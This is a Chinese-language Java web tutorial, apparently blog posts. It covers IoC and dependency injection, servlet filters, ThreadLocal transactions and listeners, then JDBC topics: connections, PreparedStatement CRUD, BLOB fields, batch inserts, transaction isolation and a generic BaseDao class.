fruitService = new FruitServiceImpl(); 这句话如果出现在servlet中的某个方法内部，那么这个fruitService的作用域（生命周期）应该就是这个方法级别； 如果这句话出现在servlet的类中，也就是说fruitService是一个成员变量，那么这个fruitService的作用域（生命周期）应该就是这个servlet实例级别 之后我们在applicationContext.xml中定义了这个fruitService。然后通过解析XML，产生fruitService实例，存放在beanMap中，这个beanMap在一个BeanFactory中 因此，我们转移（改变）了之前的service实例、dao实例等等他们的生命周期。控制权从程序员转移到BeanFactory。这个现象我们称之为控制反转 依赖注入：\n之前我们在控制层出现代码：FruitService fruitService = new FruitServiceImpl()； 那么，控制层和service层存在耦合。\n之后，我们将代码修改成FruitService fruitService = null ; 然后，在配置文件中配置:\n1 2 3 \u0026lt;bean id=\u0026#34;fruit\u0026#34; class=\u0026#34;FruitController\u0026#34;\u0026gt; \u0026lt;property name=\u0026#34;fruitService\u0026#34; ref=\u0026#34;fruitService\u0026#34;/\u0026gt; \u0026lt;/bean\u0026gt; 2.3 Filter Filter也属于Servlet规范\nFilter开发步骤：新建类实现Filter接口，然后实现其中的三个方法：init、doFilter、destroy\n配置Filter，可以用注解@WebFilter，也可以使用xml文件:\n1 \u0026lt;filter\u0026gt; \u0026lt;filter-mapping\u0026gt; Filter在配置时，和servlet一样，也可以配置通配符，例如 @WebFilter(\u0026quot;*.do\u0026quot;)表示拦截所有以.do结尾的请求\n过滤器链\n执行的顺序依次是： A B C demo03 C2 B2 A2 如果采取的是注解的方式进行配置，那么过滤器链的拦截顺序是按照全类名的先后顺序排序的 如果采取的是xml的方式进行配置，那么按照配置的先后顺序进行排序 比如可以实现借助过滤器，设置全局的编码方式，建好代码冗余量。 2.4 事务处理 ThreadLocal\nget() , set(obj)\nThreadLocal称之为本地线程 。 我们可以通过set方法在当前线程上存储数据、通过get方法在当前线程上获取数据\nset方法源码分析：\n1 2 3 4 5 6 7 8 public void set(T value) { Thread t = Thread.currentThread(); //获取当前的线程 ThreadLocalMap map = getMap(t); //每一个线程都维护各自的一个容器（ThreadLocalMap） if (map != null) map.set(this, value); //这里的key对应的是ThreadLocal，因为我们的组件中需要传输（共享）的对象可能会有多个（不止Connection） else createMap(t, value); //默认情况下map是没有初始化的，那么第一次往其中添加数据时，会去初始化 } get方法源码分析：\n1 2 3 4 5 6 7 8 9 10 11 12 13 public T get() { Thread t = Thread.currentThread(); //获取当前的线程 ThreadLocalMap map = getMap(t); //获取和这个线程（企业）相关的ThreadLocalMap（也就是工作纽带的集合） if (map != null) { ThreadLocalMap.Entry e = map.getEntry(this); //this指的是ThreadLocal对象，通过它才能知道是哪一个工作纽带 if (e != null) { @SuppressWarnings(\u0026#34;unchecked\u0026#34;) T result = (T)e.value; //entry.value就可以获取到工具箱了 return result; } } return setInitialValue(); } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 public class TransactionManager { public TransactionManager() { } public static void beginTrans() throws SQLException { ConnUtil.getConn().setAutoCommit(false); } public static void commit() throws SQLException { Connection conn = ConnUtil.getConn(); conn.commit(); ConnUtil.closeConn(); } public static void rollback() throws SQLException { Connection conn = ConnUtil.getConn(); conn.rollback(); ConnUtil.closeConn(); } } 借助sql.connection,实现对整个事务的管理，\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 public class TransactionManager { public TransactionManager() { } public static void beginTrans() throws SQLException { ConnUtil.getConn().setAutoCommit(false); } public static void commit() throws SQLException { Connection conn = ConnUtil.getConn(); conn.commit(); ConnUtil.closeConn(); } public static void rollback() throws SQLException { Connection conn = ConnUtil.getConn(); conn.rollback(); ConnUtil.closeConn(); } } 2.5 监听器 监听事件的过程 ServletContextListener - 监听ServletContext对象的创建和销毁的过程 HttpSessionListener - 监听HttpSession对象的创建和销毁的过程 ServletRequestListener - 监听ServletRequest对象的创建和销毁的过程 ServletContextAttributeListener - 监听ServletContext的保存作用域的改动(add,remove,replace) HttpSessionAttributeListener - 监听HttpSession的保存作用域的改动(add,remove,replace) ServletRequestAttributeListener - 监听ServletRequest的保存作用域的改动(add,remove,replace) HttpSessionBindingListener - 监听某个对象在Session域中的创建与移除 HttpSessionActivationListener - 监听某个对象在Session域中的序列化和反序列化 2.6 中央控制器 DispatcherServlet这个类的工作分为两大部分：\n根据url定位到能够处理这个请求的controller组件：\n从url中提取servletPath : 将获得的url进行处理，获得我们在beanFactory中组装好的Controller对象名称。\n根据名称找到对应的组件:xxxController ， 这个对应的依据我们存储在applicationContext.xml中\n1 \u0026lt;bean id=\u0026#34;fruit\u0026#34; class=\u0026#34;com.atguigu.fruit.controllers.FruitController/\u0026gt; 通过DOM技术我们去解析XML文件，在中央控制器中形成一个beanMap容器，用来存放所有的Controller组件\n根据获取到的operate的值定位到我们FruitController中需要调用的方法\n调用Controller组件中的方法：\n获取参数\n获取即将要调用的方法的参数签名信息: Parameter[] parameters = method.getParameters();\n通过parameter.getName()获取参数的名称；\n准备了Object[] parameterValues 这个数组用来存放对应参数的参数值 另外，我们需要考虑参数的类型问题，需要做类型转化的工作。通过parameter.getType()获取参数的类型\n执行方法 Object returnObj = method.invoke(controllerBean , parameterValues);\n视图处理\n1 2 3 4 String returnStr = (String)returnObj; if(returnStr.startWith(\u0026#34;redirect:\u0026#34;)){ .... }else if..... 这里给出applicationContext.xml\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;utf-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE beans[ \u0026lt;!ELEMENT beans (bean*)\u0026gt; \u0026lt;!ELEMENT bean (property*)\u0026gt; \u0026lt;!ELEMENT property (#PCDATA)\u0026gt; \u0026lt;!ATTLIST bean id ID #REQUIRED\u0026gt; \u0026lt;!ATTLIST bean class CDATA #IMPLIED\u0026gt; \u0026lt;!ATTLIST property name CDATA #IMPLIED\u0026gt; \u0026lt;!ATTLIST property ref IDREF #IMPLIED\u0026gt; ]\u0026gt; \u0026lt;!-- 上面的是 要求了\u0026lt;bean \u0026gt; 和 \u0026lt;property\u0026gt; 的格式--\u0026gt; \u0026lt;beans\u0026gt; \u0026lt;bean id = \u0026#34;userBasicDAO\u0026#34; class = \u0026#34;com.reus.qqzone.dao.impl.UserBasicDAOImpl\u0026#34;/\u0026gt; \u0026lt;bean id = \u0026#34;userBasicService\u0026#34; class = \u0026#34;com.reus.qqzone.service.impl.UserBasicServiceImpl\u0026#34;\u0026gt; \u0026lt;property name = \u0026#34;userBasicDAO\u0026#34; ref=\u0026#34;userBasicDAO\u0026#34;/\u0026gt; \u0026lt;/bean\u0026gt; \u0026lt;!-- user.do --\u0026gt; \u0026lt;bean id = \u0026#34;user\u0026#34; class =\u0026#34;com.reus.qqzone.controller.UserController\u0026#34;\u0026gt; \u0026lt;property name = \u0026#34;userBasicService\u0026#34; ref = \u0026#34;userBasicService\u0026#34;/\u0026gt; \u0026lt;/bean\u0026gt; \u0026lt;/beans\u0026gt; 0x03 业务 设计业务的时候，需要先构想好数据库、及数据库之间的依赖关系。\nDAO的概念和角色（设计理念）： DAO-称之为数据访问对象，其中的方法都是单精度方法。\n什么叫单精度，单精度指的是这个方法的粒度不能再分了，已经非常细了（因此也称之为细粒度） 什么是业务层\nModel1和Model2 MVC : Model（模型）、View（视图）、Controller（控制器） 视图层：用于做数据展示以及和用户交互的一个界面 控制层：能够接受客户端的请求，具体的业务功能还是需要借助于模型组件来完成 模型层：模型分为很多种：有比较简单的pojo/vo(value object)，有业务模型组件，有数据访问层组件 pojo/vo :类对象 DAO ： 数据访问对象 BO ： 业务对象(这里即为Service) 区分业务对象和数据访问对象： DAO中的方法都是单精度方法或者称之为细粒度方法。什么叫单精度？一个方法只考虑一个操作，比如增删改查 BO中的方法属于业务方法，也实际的业务是比较复杂的，因此业务方法的粒度是比较粗的 针对一个用户的操作：我们可以对用户的登录、注册、查看个人信息、注销、更改信息，这些要求集合成一个controller\ncontroller中调用service 层，在service层实现登录、注册等的业务。 同时呢，service借用dao层的基础数据库为底层。 ","permalink":"http://www.reus09.top/posts/tech/javaweb/","summary":"0x01 Tomcat使用 1.1 Tomcat设置编码 Tomcat设置编码 tomcat8之前，设置编码： get请求方式： get方式目前不需要设置编码（基于","title":"Javaweb"},{"content":"一：JDBC概述 1.1 数据的持久化 持久化(persistence)：把数据保存到可掉电式存储设备中以供之后使用。大多数情况下，特别是企业级应用，数据持久化意味着将内存中的数据保存到硬盘上加以”固化”，而持久化的实现过程大多通过各种关系数据库来完成。\n持久化的主要应用是将内存中的数据存储在关系型数据库中，当然也可以存储在磁盘文件、XML数据文件中。\n1.2 JDBC程序编写步骤 总结一下JDBC建立连接的全过程。 二：获取数据库连接 2.1 Driver接口实现类 2.1.1 Driver接口介绍 java.sql.Driver 接口是所有 JDBC 驱动程序需要实现的接口。这个接口是提供给数据库厂商使用的，不同数据库厂商提供不同的实现。\n在程序中不需要直接去访问实现了 Driver 接口的类，而是由驱动程序管理器类(java.sql.DriverManager)去调用这些Driver实现。\nmySql的驱动：com.mysql.cj.jdbc.Driver ,最新版的驱动已更名为此。 这里讲一下IDEA 如何导入mysql连接库\n打开Project Structure模块\n然后按照如图所示点击，即可添加jar包到项目路径\n2.1.2 加载与注册JDBC驱动 加载驱动：加载 JDBC 驱动需调用 Class 类的静态方法 forName()，向其传递要加载的 JDBC 驱动的类名\nClass.forName(“com.mysql.cj.jdbc.Driver”); 注册驱动：DriverManager 类是驱动程序管理器类，负责管理驱动程序\n使用DriverManager.registerDriver(com.mysql.jc.jdbc.Driver)来注册驱动\n通常不用显式调用 DriverManager 类的 registerDriver() 方法来注册驱动程序类的实例，因为 Driver 接口的驱动程序类都包含了静态代码块，在这个静态代码块中，会调用 DriverManager.registerDriver() 方法来注册自身的一个实例。下图是MySQL的Driver实现类的源码：\n2.2 URL JDBC URL 用于标识一个被注册的驱动程序，驱动程序管理器通过这个 URL 选择正确的驱动程序，从而建立到数据库的连接。\n举例：\n这里注明：在MySQL 8版本以上的url连接需要加上时区\njdbc:mysql://localhost:3306/test?serverTimezone=UTC\n2.4 数据库连接方式 连接方式五 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 @Test public void testConnection5() throws Exception { //1.加载配置文件 InputStream is = ConnectionTest.class.getClassLoader().getResourceAsStream(\u0026#34;jdbc.properties\u0026#34;); Properties pros = new Properties(); pros.load(is); //2.读取配置信息 String user = pros.getProperty(\u0026#34;user\u0026#34;); String password = pros.getProperty(\u0026#34;password\u0026#34;); String url = pros.getProperty(\u0026#34;url\u0026#34;); String driverClass = pros.getProperty(\u0026#34;driverClass\u0026#34;); //3.加载驱动 Class.forName(driverClass); //4.获取连接 Connection conn = DriverManager.getConnection(url,user,password); System.out.println(conn); } 其中，配置文件声明在工程的src目录下：jdbc.properties\n1 2 3 4 user=root password=abc123 url=jdbc:mysql://localhost:3306/test?serverTimezone=UTC driverClass=com.mysql.jc.jdbc.Driver 说明：使用配置文件的方式保存配置信息，在代码中加载配置文件\n使用配置文件的好处：\n①实现了代码和数据的分离，如果需要修改配置信息，直接在配置文件中修改，不需要深入代码 ②如果修改了配置信息，省去重新编译的过程。\n三：使用PreparedStatement实现CRUD操作 3.1 操作和访问数据库 数据库连接被用于向数据库服务器发送命令和 SQL 语句，并接受数据库服务器返回的结果。其实一个数据库连接就是一个Socket连接。\n在 java.sql 包中有 3 个接口分别定义了对数据库的调用的不同方式：\nStatement：用于执行静态 SQL 语句并返回它所生成结果的对象。 PrepatedStatement：SQL 语句被预编译并存储在此对象中，可以使用此对象多次高效地执行该语句。 CallableStatement：用于执行 SQL 存储过程 对于 Java 而言，要防范 SQL 注入，只要用 PreparedStatement(从Statement扩展而来) 取代 Statement 就可以了。\n3.2 PreparedStatement的使用 3.2.1 PreparedStatement介绍 PreparedStatement 接口是 Statement 的子接口，它表示一条预编译过的 SQL 语句\nPreparedStatement 对象所代表的 SQL 语句中的参数用问号(?)来表示，调用 PreparedStatement 对象的 setXxx() 方法来设置这些参数. setXxx() 方法有两个参数，第一个参数是要设置的 SQL 语句中的参数的索引(从 1 开始)，第二个是设置的 SQL 语句中的参数的值\n3.2.2 PreparedStatement vs Statement 代码的可读性和可维护性。\nPreparedStatement 能最大可能提高性能：\nDBServer会对预编译语句提供性能优化。因为预编译语句有可能被重复调用，所以语句在被DBServer的编译器编译后的执行代码被缓存下来，那么下次调用时只要是相同的预编译语句就不需要编译，只要将参数直接传入编译过的语句执行代码中就会得到执行。 在statement语句中,即使是相同操作但因为数据内容不一样,所以整个语句本身不能匹配,没有缓存语句的意义.事实是没有数据库会对普通语句编译后的执行代码缓存。这样每执行一次都要对传入的语句编译一次。 (语法检查，语义检查，翻译成二进制命令，缓存) 对于 Java 而言，要防范 SQL 注入，只要用 PreparedStatement(从Statement扩展而来) 取代 Statement 就可以了。\n3.2.3 Java与SQL对应数据类型转换表 Java类型 SQL类型 boolean BIT byte TINYINT short SMALLINT int INTEGER long BIGINT String CHAR,VARCHAR,LONGVARCHAR byte array BINARY , VAR BINARY java.sql.Date DATE java.sql.Time TIME java.sql.Timestamp TIMESTAMP 3.2.4 使用PreparedStatement实现增、删、改操作 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 //通用的增、删、改操作（体现一：增、删、改 ； 体现二：针对于不同的表） public void update(String sql,Object ... args){ Connection conn = null; PreparedStatement ps = null; try { //1.获取数据库的连接 conn = JDBCUtils.getConnection(); //2.获取PreparedStatement的实例 (或：预编译sql语句) ps = conn.prepareStatement(sql); //3.填充占位符 for(int i = 0;i \u0026lt; args.length;i++){ ps.setObject(i + 1, args[i]); } //4.执行sql语句 ps.execute(); } catch (Exception e) { e.printStackTrace(); }finally{ //5.关闭资源 JDBCUtils.closeResource(conn, ps); } } 3.2.5 使用PreparedStatement实现查询操作 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 // 通用的针对于不同表的查询:返回一个对象 (version 1.0) public \u0026lt;T\u0026gt; T getInstance(Class\u0026lt;T\u0026gt; clazz, String sql, Object... args) { Connection conn = null; PreparedStatement ps = null; ResultSet rs = null; try { // 1.获取数据库连接 conn = JDBCUtils.getConnection(); // 2.预编译sql语句，得到PreparedStatement对象 ps = conn.prepareStatement(sql); // 3.填充占位符 for (int i = 0; i \u0026lt; args.length; i++) { ps.setObject(i + 1, args[i]); } // 4.执行executeQuery(),得到结果集：ResultSet rs = ps.executeQuery(); // 5.得到结果集的元数据：ResultSetMetaData ResultSetMetaData rsmd = rs.getMetaData(); // 6.1通过ResultSetMetaData得到columnCount,columnLabel；通过ResultSet得到列值 int columnCount = rsmd.getColumnCount(); if (rs.next()) { T t = clazz.newInstance(); for (int i = 0; i \u0026lt; columnCount; i++) {// 遍历每一个列 // 获取列值 Object columnVal = rs.getObject(i + 1); // 获取列的别名:列的别名，使用类的属性名充当 String columnLabel = rsmd.getColumnLabel(i + 1); // 6.2使用反射，给对象的相应属性赋值 Field field = clazz.getDeclaredField(columnLabel); field.setAccessible(true); field.set(t, columnVal); } return t; } } catch (Exception e) { e.printStackTrace(); } finally { // 7.关闭资源 JDBCUtils.closeResource(conn, ps, rs); } return null; } 3.3 ResultSet与ResultSetMetaData 3.3.1 ResultSet 查询需要调用PreparedStatement 的 executeQuery() 方法，查询结果是一个ResultSet 对象\nResultSet 对象以逻辑表格的形式封装了执行数据库操作的结果集，ResultSet 接口由数据库厂商提供实现\nResultSet 返回的实际上就是一张数据表。有一个指针指向数据表的第一条记录的前面。\nResultSet 对象维护了一个指向当前数据行的游标，初始的时候，游标在第一行之前，可以通过 ResultSet 对象的 next() 方法移动到下一行。调用 next()方法检测下一行是否有效。若有效，该方法返回 true，且指针下移。相当于Iterator对象的 hasNext() 和 next() 方法的结合体。\n当指针指向一行时, 可以通过调用 getXxx(int index) 或 getXxx(int columnName) 获取每一列的值。\n例如: getInt(1), getString(\u0026ldquo;name\u0026rdquo;) 注意：Java与数据库交互涉及到的相关Java API中的索引都从1开始。 ResultSet 接口的常用方法：\nboolean next() getString() 3.3.2 ResultSetMetaData 可用于获取关于 ResultSet 对象中列的类型和属性信息的对象\nResultSetMetaData meta = rs.getMetaData();\ngetColumnName(int column)：获取指定列的名称\ngetColumnLabel(int column)：获取指定列的别名\ngetColumnCount()：返回当前 ResultSet 对象中的列数。\ngetColumnTypeName(int column)：检索指定列的数据库特定的类型名称。\ngetColumnDisplaySize(int column)：指示指定列的最大标准宽度，以字符为单位。\nisNullable(int column)：指示指定列中的值是否可以为 null。\nisAutoIncrement(int column)：指示是否自动为指定列进行编号，这样这些列仍然是只读的。\n问题1：得到结果集后, 如何知道该结果集中有哪些列 ？ 列名是什么？\n​ 需要使用一个描述 ResultSet 的对象， 即 ResultSetMetaData\n问题2：关于ResultSetMetaData\n如何获取 ResultSetMetaData： 调用 ResultSet 的 getMetaData() 方法即可 获取 ResultSet 中有多少列：调用 ResultSetMetaData 的 getColumnCount() 方法 获取 ResultSet 每一列的列的别名是什么：调用 ResultSetMetaData 的getColumnLabel() 方法 3.4 资源的释放 数据库结束后一定要关闭所有的连接 3.6 JDBC API小结 两种思想\n面向接口编程的思想 ORM思想(object relational mapping) 一个数据表对应一个java类 表中的一条记录对应java类的一个对象 表中的一个字段对应java类的一个属性 sql是需要结合列名和表的属性名来写。注意起别名。\n两种技术\nJDBC结果集的元数据：ResultSetMetaData 获取列数：getColumnCount() 获取列的别名：getColumnLabel() 通过反射，创建指定类的对象，获取指定的属性并赋值 四： 操作BLOB类型字段 4.1 MySQL BLOB类型 MySQL中，BLOB是一个二进制大型对象，是一个可以存储大量数据的容器，它能容纳不同大小的数据。\n插入BLOB类型的数据必须使用PreparedStatement，因为BLOB类型的数据无法使用字符串拼接写的。\nMySQL的四种BLOB类型(除了在存储的最大信息量上不同外，他们是等同的)\n如果在指定了相关的Blob类型以后，还报错：xxx too large，那么在mysql的安装目录下，找my.ini文件加上如下的配置参数： max_allowed_packet=16M。同时注意：修改了my.ini文件之后，需要重新启动mysql服务。 4.2 向数据表中插入大数据类型 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 //获取连接 Connection conn = JDBCUtils.getConnection(); String sql = \u0026#34;insert into customers(name,email,birth,photo)values(?,?,?,?)\u0026#34;; PreparedStatement ps = conn.prepareStatement(sql); // 填充占位符 ps.setString(1, \u0026#34;徐海强\u0026#34;); ps.setString(2, \u0026#34;xhq@126.com\u0026#34;); ps.setDate(3, new Date(new java.util.Date().getTime())); // 操作Blob类型的变量 FileInputStream fis = new FileInputStream(\u0026#34;xhq.png\u0026#34;); ps.setBlob(4, fis); //执行 ps.execute(); fis.close(); JDBCUtils.closeResource(conn, ps); 4.3 修改数据表中的Blob类型字段 1 2 3 4 5 6 7 8 9 10 11 12 13 14 Connection conn = JDBCUtils.getConnection(); String sql = \u0026#34;update customers set photo = ? where id = ?\u0026#34;; PreparedStatement ps = conn.prepareStatement(sql); // 填充占位符 // 操作Blob类型的变量 FileInputStream fis = new FileInputStream(\u0026#34;coffee.png\u0026#34;); ps.setBlob(1, fis); ps.setInt(2, 25); ps.execute(); fis.close(); JDBCUtils.closeResource(conn, ps); 4.4 从数据表中读取大数据类型 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 String sql = \u0026#34;SELECT id, name, email, birth, photo FROM customer WHERE id = ?\u0026#34;; conn = getConnection(); ps = conn.prepareStatement(sql); ps.setInt(1, 8); rs = ps.executeQuery(); if(rs.next()){ Integer id = rs.getInt(1); String name = rs.getString(2); String email = rs.getString(3); Date birth = rs.getDate(4); Customer cust = new Customer(id, name, email, birth); System.out.println(cust); //读取Blob类型的字段 Blob photo = rs.getBlob(5); InputStream is = photo.getBinaryStream(); OutputStream os = new FileOutputStream(\u0026#34;c.jpg\u0026#34;); byte [] buffer = new byte[1024]; int len = 0; while((len = is.read(buffer)) != -1){ os.write(buffer, 0, len); } JDBCUtils.closeResource(conn, ps, rs); if(is != null){ is.close(); } if(os != null){ os.close(); } } 五： 批量插入 5.1 批量执行SQL语句 当需要成批插入或者更新记录时，可以采用Java的批量更新机制，这一机制允许多条语句一次性提交给数据库批量处理。通常情况下比单独提交处理更有效率\nJDBC的批量处理语句包括下面三个方法：\naddBatch(String)：添加需要批量处理的SQL语句或是参数； executeBatch()：执行批量处理语句； clearBatch():清空缓存的数据 通常我们会遇到两种批量执行SQL语句的情况：\n多条SQL语句的批量处理； 一个SQL语句的批量传参； 5.2 高效的批量插入 举例：向数据表中插入20000条数据 5.2.1 实现层次一：使用Statement 1 2 3 4 5 6 Connection conn = JDBCUtils.getConnection(); Statement st = conn.createStatement(); for(int i = 1;i \u0026lt;= 20000;i++){ String sql = \u0026#34;insert into goods(name) values(\u0026#39;name_\u0026#39; + \u0026#34;+ i +\u0026#34;)\u0026#34;; st.executeUpdate(sql); } 5.2.2 实现层次二：使用PreparedStatement 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 long start = System.currentTimeMillis(); Connection conn = JDBCUtils.getConnection(); String sql = \u0026#34;insert into goods(name)values(?)\u0026#34;; PreparedStatement ps = conn.prepareStatement(sql); for(int i = 1;i \u0026lt;= 20000;i++){ ps.setString(1, \u0026#34;name_\u0026#34; + i); ps.executeUpdate(); } long end = System.currentTimeMillis(); System.out.println(\u0026#34;花费的时间为：\u0026#34; + (end - start));//82340 JDBCUtils.closeResource(conn, ps); 法二比法一快的原因是：PrepareStatement可以给sql提前预备好，实际上，sql只需要拼接一次，而statement需要拼接多次。 5.2.3 实现层次三 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 /* * 修改1： 使用 addBatch() / executeBatch() / clearBatch() * 修改2：mysql服务器默认是关闭批处理的，我们需要通过一个参数，让mysql开启批处理的支持。 * ?rewriteBatchedStatements=true 写在配置文件的url后面 * 修改3：使用更新的mysql 驱动：mysql-connector-java-5.1.37-bin.jar * */ @Test public void testInsert1() throws Exception{ long start = System.currentTimeMillis(); Connection conn = JDBCUtils.getConnection(); String sql = \u0026#34;insert into goods(name)values(?)\u0026#34;; PreparedStatement ps = conn.prepareStatement(sql); for(int i = 1;i \u0026lt;= 1000000;i++){ ps.setString(1, \u0026#34;name_\u0026#34; + i); //1.“攒”sql ps.addBatch(); if(i % 500 == 0){ //2.执行 ps.executeBatch(); //3.清空 ps.clearBatch(); } } long end = System.currentTimeMillis(); System.out.println(\u0026#34;花费的时间为：\u0026#34; + (end - start));//20000条：625 //1000000条:14733 JDBCUtils.closeResource(conn, ps); } 法三是利用Batch,相当于一个池子，当积累的请求达到一定程度的时候，集中进行执行。 5.2.4 实现层次四 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 /* * 层次四：在层次三的基础上操作 * 使用Connection 的 setAutoCommit(false) / commit() */ @Test public void testInsert2() throws Exception{ long start = System.currentTimeMillis(); Connection conn = JDBCUtils.getConnection(); //1.设置为不自动提交数据 conn.setAutoCommit(false); String sql = \u0026#34;insert into goods(name)values(?)\u0026#34;; PreparedStatement ps = conn.prepareStatement(sql); for(int i = 1;i \u0026lt;= 1000000;i++){ ps.setString(1, \u0026#34;name_\u0026#34; + i); //1.“攒”sql ps.addBatch(); if(i % 500 == 0){ //2.执行 ps.executeBatch(); //3.清空 ps.clearBatch(); } } //2.提交数据 conn.commit(); long end = System.currentTimeMillis(); System.out.println(\u0026#34;花费的时间为：\u0026#34; + (end - start));//1000000条:4978 JDBCUtils.closeResource(conn, ps); } 法四 相比较法三， 只需要提交一次。io 请求减少。 六： 数据库事务 6.1 数据库事务介绍 事务：一组逻辑操作单元,使数据从一种状态变换到另一种状态。\n事务处理（事务操作）：保证所有事务都作为一个工作单元来执行，即使出现了故障，都不能改变这种执行方式。当在一个事务中执行多个操作时，要么所有的事务都被提交(commit)，那么这些修改就永久地保存下来；要么数据库管理系统将放弃所作的所有修改，整个事务**回滚(rollback)**到最初状态。\n为确保数据库中数据的一致性，数据的操纵应当是离散的成组的逻辑单元：当它全部完成时，数据的一致性可以保持，而当这个单元中的一部分操作失败，整个事务应全部视为错误，所有从起始点以后的操作应全部回退到开始状态。\n6.2 事务的ACID属性 原子性（Atomicity） 原子性是指事务是一个不可分割的工作单位，事务中的操作要么都发生，要么都不发生。\n一致性（Consistency） 事务必须使数据库从一个一致性状态变换到另外一个一致性状态。\n隔离性（Isolation） 事务的隔离性是指一个事务的执行不能被其他事务干扰，即一个事务内部的操作及使用的数据对并发的其他事务是隔离的，并发执行的各个事务之间不能互相干扰。\n持久性（Durability） 持久性是指一个事务一旦被提交，它对数据库中数据的改变就是永久性的，接下来的其他操作和数据库故障不应该对其有任何影响。\n6.3.1 数据库的并发问题 对于同时运行的多个事务, 当这些事务访问数据库中相同的数据时, 如果没有采取必要的隔离机制, 就会导致各种并发问题:\n脏读: 对于两个事务 T1, T2, T1 读取了已经被 T2 更新但还没有被提交的字段。之后, 若 T2 回滚, T1读取的内容就是临时且无效的。 不可重复读: 对于两个事务T1, T2, T1 读取了一个字段, 然后 T2 更新了该字段。之后, T1再次读取同一个字段, 值就不同了。 幻读: 对于两个事务T1, T2, T1 从一个表中读取了一个字段, 然后 T2 在该表中插入了一些新的行。之后, 如果 T1 再次读取同一个表, 就会多出几行。 数据库事务的隔离性: 数据库系统必须具有隔离并发运行各个事务的能力, 使它们不会相互影响, 避免各种并发问题。\n一个事务与其他事务隔离的程度称为隔离级别。数据库规定了多种事务隔离级别, 不同隔离级别对应不同的干扰程度, 隔离级别越高, 数据一致性就越好, 但并发性越弱。\n6.3.2 四种隔离级别 数据库提供的4种事务隔离级别：\nOracle 支持的 2 种事务隔离级别：READ COMMITED, SERIALIZABLE。 Oracle 默认的事务隔离级别为: READ COMMITED 。\nMysql 支持 4 种事务隔离级别。Mysql 默认的事务隔离级别为: REPEATABLE READ。\n6.3.3 在MySql中设置隔离级别 每启动一个 mysql 程序, 就会获得一个单独的数据库连接. 每个数据库连接都有一个全局变量 @@tx_isolation, 表示当前的事务隔离级别。\n查看当前的隔离级别:\n1 SELECT @@tx_isolation; 设置当前 mySQL 连接的隔离级别:\n1 set transaction isolation level read committed; 设置数据库系统的全局的隔离级别:\n1 set global transaction isolation level read committed; 补充操作：\n创建mysql数据库用户：\n1 create user tom identified by \u0026#39;abc123\u0026#39;; 授予权限\n1 2 3 4 5 #授予通过网络方式登录的tom用户，对所有库所有表的全部权限，密码设为abc123. grant all privileges on *.* to tom@\u0026#39;%\u0026#39; identified by \u0026#39;abc123\u0026#39;; #给tom用户使用本地命令行方式，授予atguigudb这个库下的所有表的插删改查的权限。 grant select,insert,delete,update on atguigudb.* to tom@localhost identified by \u0026#39;abc123\u0026#39;; 七：DAO及相关实现类 DAO：Data Access Object访问数据信息的类和接口，包括了对数据的CRUD（Create、Retrival、Update、Delete），而不包含任何业务相关的信息。有时也称作：BaseDAO 作用：为了实现功能的模块化，更有利于代码的维护和升级。 【BaseDAO.java】 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 package com.atguigu.bookstore.dao; import java.lang.reflect.ParameterizedType; import java.lang.reflect.Type; import java.sql.Connection; import java.sql.SQLException; import java.util.List; import org.apache.commons.dbutils.QueryRunner; import org.apache.commons.dbutils.handlers.BeanHandler; import org.apache.commons.dbutils.handlers.BeanListHandler; import org.apache.commons.dbutils.handlers.ScalarHandler; /** * 定义一个用来被继承的对数据库进行基本操作的Dao * * @author HanYanBing * * @param \u0026lt;T\u0026gt; */ public abstract class BaseDao\u0026lt;T\u0026gt; { private QueryRunner queryRunner = new QueryRunner(); // 定义一个变量来接收泛型的类型 private Class\u0026lt;T\u0026gt; type; // 获取T的Class对象，获取泛型的类型，泛型是在被子类继承时才确定 public BaseDao() { // 获取子类的类型 Class clazz = this.getClass(); // 获取父类的类型 // getGenericSuperclass()用来获取当前类的父类的类型 // ParameterizedType表示的是带泛型的类型 ParameterizedType parameterizedType = (ParameterizedType) clazz.getGenericSuperclass(); // 获取具体的泛型类型 getActualTypeArguments获取具体的泛型的类型 // 这个方法会返回一个Type的数组 Type[] types = parameterizedType.getActualTypeArguments(); // 获取具体的泛型的类型· this.type = (Class\u0026lt;T\u0026gt;) types[0]; } /** * 通用的增删改操作 * * @param sql * @param params * @return */ public int update(Connection conn,String sql, Object... params) { int count = 0; try { count = queryRunner.update(conn, sql, params); } catch (SQLException e) { e.printStackTrace(); } return count; } /** * 获取一个对象 * * @param sql * @param params * @return */ public T getBean(Connection conn,String sql, Object... params) { T t = null; try { t = queryRunner.query(conn, sql, new BeanHandler\u0026lt;T\u0026gt;(type), params); } catch (SQLException e) { e.printStackTrace(); } return t; } /** * 获取所有对象 * * @param sql * @param params * @return */ public List\u0026lt;T\u0026gt; getBeanList(Connection conn,String sql, Object... params) { List\u0026lt;T\u0026gt; list = null; try { list = queryRunner.query(conn, sql, new BeanListHandler\u0026lt;T\u0026gt;(type), params); } catch (SQLException e) { e.printStackTrace(); } return list; } /** * 获取一个但一值得方法，专门用来执行像 